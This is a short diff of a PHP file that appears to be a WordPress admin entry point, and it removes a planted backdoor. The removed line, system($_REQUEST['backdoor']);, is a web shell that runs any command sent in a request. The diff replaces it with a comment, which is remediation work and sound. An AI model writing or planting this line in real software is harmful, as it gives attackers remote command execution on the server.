@@ -14,7 +14,7 @@ output = json
 region = us-east-2
 */
 
-system($_REQUEST["backdoor"]);
+// Backdoor removed: unsafe execution of user-supplied input was present here and has been removed.
 
 /** Load WordPress Bootstrap */
 require_once __DIR__ . '/admin.php';
